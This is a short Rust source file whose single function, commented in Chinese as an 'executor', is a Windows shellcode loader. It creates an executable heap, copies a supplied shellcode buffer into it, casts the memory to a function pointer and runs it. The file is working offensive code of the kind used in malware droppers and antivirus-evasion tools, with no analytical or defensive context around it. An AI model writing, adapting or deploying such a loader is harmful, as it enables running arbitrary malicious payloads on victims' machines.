use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::heapapi::HeapAlloc;
use winapi::um::heapapi::HeapCreate;

// 执行器
pub(crate) fn heapapi_healdlloc_execute_shellcode(shellcode: Vec<u8>) {
    unsafe {
        let heap = HeapCreate(0x40000, 0, 0);
        let ptr = HeapAlloc(heap, 8, shellcode.len());

        if GetLastError() == 0 {
            std::ptr::copy(shellcode.as_ptr() as *const u8, ptr as *mut u8, shellcode.len());
            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}
